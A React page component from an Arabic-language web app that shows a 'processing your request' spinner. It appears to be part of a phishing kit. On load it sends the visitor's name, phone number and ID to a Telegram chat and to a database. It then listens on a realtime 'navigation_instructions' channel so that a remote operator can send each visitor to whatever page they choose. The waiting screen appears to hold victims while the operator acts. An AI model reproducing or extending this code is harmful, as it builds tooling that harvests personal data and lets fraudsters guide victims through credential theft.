import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useRegistration } from '../contexts/RegistrationContext';
import { supabase } from '../integrations/supabase/client';
import Header from '../components/Header';

const ProcessingRequest = () => {
  const navigate = useNavigate();
  const { formData, sendTelegramMessage } = useRegistration();
  const [status, setStatus] = useState('جاري معالجة طلبك...');

  useEffect(() => {
    const registerUser = async () => {
      try {
        // تسجيل المستخدم في قاعدة البيانات
        const { error } = await supabase
          .from('processing_users')
          .insert({
            user_id: formData.visitorId || `user_${Date.now()}`,
            name: formData.fullName || 'غير محدد',
            phone: formData.phone || 'غير محدد',
          });

        if (error) {
          console.error('Error registering user:', error);
        }

        await sendTelegramMessage(
          `⏳ المستخدم في صفحة المعالجة\n\n` +
          `🆔 معرف المستخدم: ${formData.visitorId || 'غير متوفر'}\n` +
          `👤 الاسم: ${formData.fullName || 'غير محدد'}\n` +
          `📱 الهاتف: ${formData.phone || 'غير محدد'}`
        );
      } catch (err) {
        console.error('Error:', err);
      }
    };

    registerUser();
  }, []);

  // الاستماع لتعليمات التوجيه من قاعدة البيانات
  useEffect(() => {
    const channel = supabase
      .channel('navigation-changes')
      .on(
        'postgres_changes',
        {
          event: '*',
          schema: 'public',
          table: 'navigation_instructions',
          filter: `user_id=eq.${formData.visitorId}`,
        },
        (payload: any) => {
          console.log('Navigation instruction received:', payload);
          if (payload.new && payload.new.route) {
            navigate(payload.new.route);
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [formData.visitorId, navigate]);

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col" dir="rtl">
      <Header />

      <div className="flex-1 flex flex-col items-center justify-center p-6">
        <div className="bg-white rounded-2xl shadow-lg p-8 w-full max-w-md text-center">
          <div className="mb-8">
            <div className="w-20 h-20 bg-[#6A0F49] rounded-full flex items-center justify-center mx-auto mb-6 animate-pulse">
              <svg className="w-10 h-10 text-white animate-spin" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
              </svg>
            </div>
            <h1 className="text-2xl font-bold text-[#6A0F49] mb-4">
              {status}
            </h1>
            <p className="text-gray-600 text-sm mb-6">
              الرجاء الانتظار وعدم إغلاق هذه الصفحة
            </p>
          </div>

          <div className="flex justify-center gap-2">
            <div className="w-3 h-3 bg-[#6A0F49] rounded-full animate-bounce" style={{ animationDelay: '0ms' }} />
            <div className="w-3 h-3 bg-[#6A0F49] rounded-full animate-bounce" style={{ animationDelay: '150ms' }} />
            <div className="w-3 h-3 bg-[#6A0F49] rounded-full animate-bounce" style={{ animationDelay: '300ms' }} />
          </div>

          <div className="mt-8 p-4 bg-gray-50 rounded-lg">
            <p className="text-sm text-gray-500">
              رقم الطلب: <span className="font-bold">{formData.visitorId?.substring(0, 8) || 'N/A'}</span>
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};

export default ProcessingRequest;
